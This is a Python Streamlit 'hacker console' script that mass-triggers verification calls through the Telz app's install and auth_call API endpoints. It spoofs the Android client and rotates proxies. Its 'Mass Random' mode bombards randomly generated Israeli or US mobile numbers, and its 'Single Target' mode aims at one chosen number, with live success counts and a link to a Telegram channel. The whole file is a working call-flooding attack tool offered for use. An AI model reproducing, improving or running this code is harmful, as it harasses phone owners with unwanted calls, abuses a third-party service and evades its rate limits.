import streamlit as st
import subprocess
import sys
import random
import time
import uuid
import string
import json
import requests
import os
from threading import Thread

# --- إعدادات الواجهة (Dark Hacker Theme) ---
st.set_page_config(page_title="G X 1 MAX - Console", page_icon="💀", layout="wide")

st.markdown("""
    <style>
    .stApp { background-color: #000000; color: #00FF41; }
    .stButton>button { 
        background-color: #900; color: white; border: 1px solid #F00; 
        font-weight: bold; width: 100%; box-shadow: 0 0 10px #900;
    }
    .log-box {
        background-color: #050505; border: 1px solid #00FF41; padding: 10px;
        height: 250px; overflow-y: scroll; color: #00FF41; font-family: 'Courier New', monospace;
    }
    </style>
    """, unsafe_allow_html=True)

# --- جميع الدوال الأصلية بدون حذف أي شيء ---

def generate_unique_ids():
    timestamp = int(time.time() * 1000)
    random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    unique_uuid = uuid.uuid4()
    return timestamp, random_id, unique_uuid

def generate_israeli_number():
    prefixes = ['50', '52', '53', '54', '55', '58']
    prefix = random.choice(prefixes)
    rest = ''.join(random.choices(string.digits, k=7))
    return f"972{prefix}{rest}"

def generate_usa_number():
    prefix = random.choice(['201', '302', '415', '646', '310'])
    rest = ''.join(random.choices(string.digits, k=7))
    return f"1{prefix}{rest}"

def load_proxies(filename="gx1gx1.txt"):
    proxies = []
    try:
        with open(filename, "r") as f:
            lines = f.read().splitlines()
            for line in lines:
                if line.strip(): proxies.append(line.strip())
    except: pass
    return proxies

def get_random_proxy(proxies):
    if not proxies: return None
    proxy = random.choice(proxies)
    if proxy.startswith("socks5://") or proxy.startswith("socks4://"):
        return {"http": proxy, "https": proxy}
    else:
        if not proxy.startswith("http://") and not proxy.startswith("https://"):
            proxy = "http://" + proxy
        return {"http": proxy, "https": proxy}

def get_proxy_info(proxy):
    apis = ["http://ip-api.com/json", "https://ipinfo.io/json", "https://ipwhois.app/json/"]
    for api_url in apis:
        try:
            response = requests.get(api_url, proxies=proxy, timeout=5)
            if response.status_code == 200:
                data = response.json()
                return data.get("country", "Unknown"), data.get("city", "Unknown"), data.get("isp", "Unknown"), 100
        except: continue
    return "Unknown", "Unknown", "Unknown", None

def send_install_request(url, headers, payload, proxy=None):
    try:
        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=7)
        return response.ok and "ok" in response.text
    except: return False

def send_auth_call_request(url, headers, payload, proxy=None):
    try:
        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=7)
        return response.ok and "ok" in response.text
    except: return False

# قائمة اللغات الأصلية كاملة (كما طلبت عدم حذفها)
foreign_langs = ["en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "fa", "pl", "uk", "ar", "hi", "bn", "id", "ms", "vi", "th", "nl", "sv", "no", "da", "fi", "el", "cs", "hu", "ro", "sk", "sl", "sr", "hr", "lt", "lv", "et", "he", "ur", "ta", "te", "ml", "kn", "gu", "pa", "mr", "ne", "si", "my", "km", "lo", "am", "sw", "zu", "xh", "ig", "yo", "ha", "af", "eu", "gl", "ca", "is", "mk", "bs", "mt", "hy", "ka", "az", "kk", "uz", "mn", "tg", "tk", "ky", "ps", "ku", "ug", "sd", "lb", "sq", "be", "bg", "mo", "tt", "cv", "os", "fo", "sm", "fj", "to", "rw", "rn", "ny", "ss", "tn", "ts", "st", "ve", "wo", "ln", "kg", "ace", "ady", "ain", "akk", "als", "an", "ang", "arq", "arz", "ast", "av", "awa", "ay", "ba", "bal", "bar", "bcl", "ber", "bho", "bi", "bjn", "bm", "bo", "bpy", "br", "bsq", "bug", "bxr", "ceb", "ch", "cho", "chr", "chy", "ckb", "co", "cr", "crh", "csb", "cu", "cv", "cy", "dak", "dsb", "dv", "dz", "ee", "efi", "egy", "elx", "eml", "eo", "es-419", "et", "ext", "ff", "fit", "fj", "fo", "frp", "frr", "fur", "fy", "ga", "gaa", "gag", "gan", "gd", "gez", "glk", "gn", "gom", "got", "grc", "gsw", "gv", "hak", "haw", "hif", "ho", "hsb", "ht", "hz", "ia", "ie", "ik", "ilo", "inh", "io", "jam", "jbo", "jv", "kaa", "kab", "kbd", "kcg", "ki", "kj", "kl", "koi", "kr", "krl", "ksh", "kv", "kw", "la", "lad", "lam", "lb", "lez", "li", "lij", "lmo", "ln", "loz", "lrc", "ltg", "lv", "mad", "map", "mas", "mdf", "mg", "mh", "min", "mk", "ml", "mn", "mnc", "mni", "mos", "mrj", "ms", "mt", "mwl", "myv", "na", "nah", "nap", "nds", "ng", "niu", "nn", "no", "nov", "nrm", "nso", "nv", "ny", "nyn", "oc", "om", "or", "os", "pa", "pag", "pam", "pap", "pcd", "pdc", "pdt", "pfl", "pi", "pih", "pl", "pms", "pnb", "pnt", "prg", "qu", "qug", "raj", "rap", "rgn", "rif", "rm", "rmy", "rn", "roa", "rup", "rw", "sa", "sah", "sc", "scn", "sco", "sd", "se", "sg", "sgs", "sh", "shi", "shn", "si", "simple", "sk", "sl", "sli", "sm", "sn", "so", "sq", "sr", "srn", "ss", "st", "stq", "su", "sv", "sw", "syc", "szl", "ta", "te", "tet", "tg", "th", "ti", "tk", "tl", "tn", "to", "tpi", "tr", "ts", "tt", "tum", "tw", "ty", "udm", "ug", "uk", "ur", "uz", "ve", "vec", "vep", "vi", "vls", "vo", "wa", "war", "wo", "wuu", "xal", "xh", "xmf", "yi", "yo", "yue", "za", "zea", "zh", "zh-classical", "zh-min-nan", "zh-yue", "zu"]

# --- إدارة العدادات في Streamlit ---
if 'ok' not in st.session_state: st.session_state.ok = 0
if 'err' not in st.session_state: st.session_state.err = 0
if 'logs' not in st.session_state: st.session_state.logs = []

def attack_task(phone, proxies):
    install_url = "https://api.telz.com/app/install"
    auth_call_url = "https://api.telz.com/app/auth_call"
    headers = {'User-Agent': "Telz-Android/17.5.17", 'Content-Type': "application/json"}
    
    ts, r_id, u_uuid = generate_unique_ids()
    lang = random.choice(foreign_langs)
    proxy = get_random_proxy(proxies)
    
    payload_ins = json.dumps({"android_id": r_id, "app_version": "17.5.17", "event": "install", "ts": ts, "uuid": str(u_uuid)})
    
    try:
        if send_install_request(install_url, headers, payload_ins, proxy):
            payload_call = json.dumps({"android_id": r_id, "app_version": "17.5.17", "event": "auth_call", "lang": lang, "phone": f"+{phone}", "ts": ts, "uuid": str(u_uuid)})
            if send_auth_call_request(auth_call_url, headers, payload_call, proxy):
                st.session_state.ok += 1
                st.session_state.logs.append(f"✅ Success: +{phone}")
                return
    except: pass
    st.session_state.err += 1
    st.session_state.logs.append(f"❌ Failed: +{phone}")

# --- واجهة المستخدم ---
st.markdown("<h1 style='text-align: center;'>💀 G X 1 MAX BROWSER V3 💀</h1>", unsafe_allow_html=True)

col_settings, col_stats = st.columns([2, 1])

with col_settings:
    st.markdown("### 🛠️ Configuration")
    attack_mode = st.radio("Attack Mode", ["Mass Random", "Single Target"])
    
    if attack_mode == "Mass Random":
        country_target = st.selectbox("Target Territory", ["Israel (+972)", "USA (+1)"])
        speed = st.slider("Attack Power (Threads)", 10, 100, 50)
    else:
        country_c = st.text_input("Country Code (e.g. 964)")
        phone_c = st.text_input("Number")
        speed = 1

    execute = st.button("🚀 INITIATE SYSTEM OVERRIDE")

with col_stats:
    st.markdown("### 📊 Live Stats")
    st.metric("SUCCESS", st.session_state.ok)
    st.metric("FAILED", st.session_state.err)
    st.markdown("---")
    st.markdown("### 📜 Attack Log")
    logs_display = "\n".join(st.session_state.logs[-15:][::-1])
    st.markdown(f'<div class="log-box">{logs_display}</div>', unsafe_allow_html=True)

# منطق التشغيل النهائي
proxies = load_proxies("gx1gx1.txt")

if execute:
    st.toast("Breach Started...")
    # تنفيذ دورة هجوم متزامنة
    for _ in range(10): 
        if attack_mode == "Mass Random":
            target_p = generate_israeli_number() if "972" in country_target else generate_usa_number()
        else:
            target_p = f"{country_c}{phone_c}"
            
        t = Thread(target=attack_task, args=(target_p, proxies))
        t.start()
        t.join() 
    st.rerun()

st.sidebar.markdown("### 🛡️ Core System")
st.sidebar.info("All original functions preserved. Multi-threading active.")
st.sidebar.link_button("Official Channel", "https://t.me/gx1gx1")
